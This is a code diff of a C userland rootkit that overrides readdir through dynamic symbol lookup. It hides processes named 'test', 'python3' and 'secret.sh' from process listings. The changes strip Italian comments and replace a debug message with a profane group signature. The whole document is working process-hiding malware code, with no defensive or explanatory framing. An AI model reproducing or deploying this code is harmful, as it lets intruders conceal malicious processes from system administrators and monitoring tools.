@@ -8,17 +8,17 @@
 #include <sys/stat.h>
 
 #define NUM_NAMES 3
-const char *HIDE_NAMES[NUM_NAMES] = {"test", "python3", "secret.sh"};  // Aggiungi qui i nomi dei processi da nascondere
+const char *HIDE_NAMES[NUM_NAMES] = {"test", "python3", "secret.sh"}; 
 
 static struct dirent *(*old_readdir) (DIR *) = NULL;
 
 int should_hide_process(const char *process_name) {
     for (int i = 0; i < NUM_NAMES; i++) {
         if (strcmp(process_name, HIDE_NAMES[i]) == 0) {
-            return 1;  // Il processo deve essere nascosto
+            return 1;  
         }
     }
-    return 0;  // Il processo non deve essere nascosto
+    return 0; 
 }
 
 struct dirent *readdir(DIR *dirp) {
@@ -28,7 +28,7 @@ struct dirent *readdir(DIR *dirp) {
             error(1, errno, "dlsym");
         }
 
-        fprintf(stderr, "Catched\n");
+        fprintf(stderr, "Fucked by Group7\n");
     }
 
     struct dirent *direntp;
@@ -46,7 +46,7 @@ struct dirent *readdir(DIR *dirp) {
                 
                 if (should_hide_process(name)) {
                     fclose(comm);
-                    continue;  // Nascondi il processo
+                    continue;  
                 }
             }
             fclose(comm);
